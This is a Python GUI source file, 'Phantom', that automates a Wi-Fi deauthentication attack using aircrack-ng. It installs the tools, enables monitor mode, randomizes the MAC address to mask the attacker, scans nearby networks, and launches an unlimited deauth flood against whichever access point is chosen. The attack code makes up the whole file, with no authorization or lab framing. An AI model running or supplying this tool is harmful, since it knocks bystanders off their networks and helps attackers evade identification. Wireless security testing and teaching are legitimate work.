# === Phantom Wi-Fi Deauth GUI by Hrishav ===

import subprocess, shutil, os, threading, time, signal
from tkinter import *
from tkinter import ttk

REQUIRED_CMDS = {
    "airmon-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "iwconfig": "wireless-tools",
    "macchanger": "macchanger"
}

def run_cmd(cmd, capture_output=False):
    result = subprocess.run(cmd, shell=True, text=True, capture_output=capture_output)
    return result.stdout.strip() if capture_output else None

def check_dependencies():
    missing = []
    for cmd, pkg in REQUIRED_CMDS.items():
        if shutil.which(cmd) is None:
            missing.append(pkg)
    if missing:
        unique_pkgs = sorted(set(missing))
        for pkg in unique_pkgs:
            result = subprocess.run(f"sudo apt install -y {pkg}", shell=True)
            if result.returncode != 0:
                return f"FAILED to install {pkg}. Exiting."
        return "All dependencies installed."
    return "All dependencies present."

def list_interfaces():
    output = run_cmd("iwconfig", capture_output=True)
    return [line.split()[0] for line in output.splitlines() if "IEEE 802.11" in line]

def enable_monitor_mode(interface):
    output = run_cmd(f"iwconfig {interface}", capture_output=True)
    if "Mode:Monitor" in output:
        return interface
    run_cmd("sudo airmon-ng check kill")
    run_cmd(f"sudo airmon-ng start {interface}")
    return interface + "mon"

def randomize_mac(interface):
    run_cmd(f"sudo ifconfig {interface} down")
    run_cmd(f"sudo macchanger -r {interface}")
    run_cmd(f"sudo ifconfig {interface} up")
    return run_cmd(f"macchanger -s {interface}", capture_output=True)

def parse_networks():
    networks = []
    try:
        with open("networks-01.csv", "r", encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            parsing = False
            for line in lines:
                if line.strip() == "" and not parsing:
                    parsing = True
                    continue
                if parsing and line.strip():
                    parts = line.split(',')
                    if len(parts) > 13:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip() or "<Hidden>"
                        if bssid.lower() != "bssid":
                            networks.append({"bssid": bssid, "channel": channel, "essid": essid})
    except FileNotFoundError:
        return []
    return networks

class PhantomGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom")
        self.root.geometry("1000x700")
        self.root.configure(bg="#1e1e2f")

        self.style = ttk.Style()
        self.style.configure("TButton", font=("Consolas", 12), padding=6)

        self.output_box = Text(root, height=20, width=120, bg="black", fg="lime", font=("Consolas", 10))
        self.output_box.pack(pady=10)

        self.eta_label = Label(root, text="", fg="white", bg="#1e1e2f", font=("Consolas", 12))
        self.eta_label.pack()

        self.btn_frame = Frame(root, bg="#1e1e2f")
        self.btn_frame.pack(pady=10)

        Button(self.btn_frame, text="1. Check Dependencies", command=self.wrap(self.check_deps)).grid(row=0, column=0, padx=5)
        Button(self.btn_frame, text="2. Select Interface", command=self.wrap(self.select_interface)).grid(row=0, column=1, padx=5)
        Button(self.btn_frame, text="3. Enable Monitor", command=self.wrap(self.monitor_mode)).grid(row=0, column=2, padx=5)
        Button(self.btn_frame, text="4. Randomize MAC", command=self.wrap(self.random_mac)).grid(row=1, column=0, padx=5, pady=5)
        Button(self.btn_frame, text="5. Scan Networks", command=self.wrap(self.scan)).grid(row=1, column=1, padx=5, pady=5)
        Button(self.btn_frame, text="6. Launch Deauth", command=self.wrap(self.launch_deauth)).grid(row=1, column=2, padx=5, pady=5)
        Button(self.btn_frame, text="STOP", fg="white", bg="red", command=self.wrap(self.stop_attack)).grid(row=2, column=1, pady=5)
        Button(self.btn_frame, text="ABORT", fg="black", bg="orange", command=self.wrap(self.abort_all)).grid(row=2, column=2, pady=5)

        self.footer = Label(root, text="Made w/❤️ by Hrishav", fg="lightgrey", bg="#1e1e2f", font=("Consolas", 10))
        self.footer.place(relx=0.5, rely=0.97, anchor=CENTER)

        self.interface = None
        self.mon_iface = None
        self.deauth_proc = None
        self.networks = []
        self.scan_thread = None
        self.abort_scan = False

    def wrap(self, func):
        return lambda: threading.Thread(target=func).start()

    def log(self, msg):
        self.output_box.insert(END, f"{msg}\n")
        self.output_box.see(END)

    def clear_log(self):
        self.output_box.delete("1.0", END)

    def update_eta(self, msg):
        self.eta_label.config(text=msg)

    def check_deps(self):
        self.log(check_dependencies())

    def select_interface(self):
        interfaces = list_interfaces()
        if not interfaces:
            self.log("No interfaces found.")
            return
        self.interface = interfaces[0]
        self.log(f"Selected Interface: {self.interface}")

    def monitor_mode(self):
        if not self.interface:
            self.log("Select an interface first.")
            return
        self.mon_iface = enable_monitor_mode(self.interface)
        self.log(f"Monitor Mode Enabled: {self.mon_iface}")

    def random_mac(self):
        if not self.mon_iface:
            self.log("Enable monitor mode first.")
            return
        mac = randomize_mac(self.mon_iface)
        self.log(f"New MAC:\n{mac}")

    def scan(self):
        if not self.mon_iface:
            self.log("Enable monitor mode first.")
            return
        if os.path.exists("networks-01.csv"):
            os.remove("networks-01.csv")

        self.networks = []
        self.abort_scan = False

        def scanner():
            self.log("Scanning for networks...")
            proc = subprocess.Popen(f"sudo airodump-ng --write networks --output-format csv {self.mon_iface}", shell=True)
            for i in range(10, 0, -1):
                if self.abort_scan:
                    proc.terminate()
                    self.update_eta("")
                    self.log("Scan aborted.")
                    return
                self.update_eta(f"ETA: {i}s")
                time.sleep(1)

            proc.send_signal(signal.SIGINT)
            proc.wait()
            self.update_eta("")
            self.log("Scan complete.")
            self.networks = parse_networks()
            if not self.networks:
                self.log("No networks found.")
            else:
                self.log("Available Networks:")
                for idx, net in enumerate(self.networks):
                    self.log(f"{idx+1}. {net['essid']} ({net['bssid']}) - Ch: {net['channel']}")

        self.scan_thread = threading.Thread(target=scanner)
        self.scan_thread.start()

    def launch_deauth(self):
        if not self.networks:
            self.log("No scanned networks found. Please scan first.")
            return

        def wait_for_input():
            win = Toplevel(self.root)
            win.title("Select Target")
            win.geometry("300x150")
            Label(win, text="Enter index:").pack(pady=10)
            entry = Entry(win)
            entry.pack()

            def on_submit():
                try:
                    idx = int(entry.get()) - 1
                    if 0 <= idx < len(self.networks):
                        target = self.networks[idx]
                        win.destroy()
                        self.log(f"🚨 Starting deauth on {target['essid']} ({target['bssid']}) Channel {target['channel']}")
                        run_cmd(f"sudo iwconfig {self.mon_iface} channel {target['channel']}")
                        self.deauth_proc = subprocess.Popen(
                            f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {self.mon_iface}",
                            shell=True
                        )
                        self.log("⚠️ Deauth attack in progress... Press STOP to halt.")
                    else:
                        self.log("Invalid index.")
                except ValueError:
                    self.log("Invalid input.")
            Button(win, text="Start", command=on_submit).pack(pady=10)

        threading.Thread(target=wait_for_input).start()

    def stop_attack(self):
        if self.deauth_proc and self.deauth_proc.poll() is None:
            self.deauth_proc.terminate()
            self.log("🛑 Deauth attack stopped.")
        self.restore_interface()

    def abort_all(self):
        self.abort_scan = True
        if self.deauth_proc and self.deauth_proc.poll() is None:
            self.deauth_proc.terminate()
        self.restore_interface()
        self.clear_log()
        self.update_eta("")
        self.networks = []
        self.log("Aborted. Ready to start fresh.")

    def restore_interface(self):
        if self.mon_iface:
            run_cmd(f"sudo airmon-ng stop {self.mon_iface}")
            run_cmd("sudo systemctl restart NetworkManager")
            self.log("Interface restored.")

if __name__ == "__main__":
    root = Tk()
    app = PhantomGUI(root)
    root.mainloop()
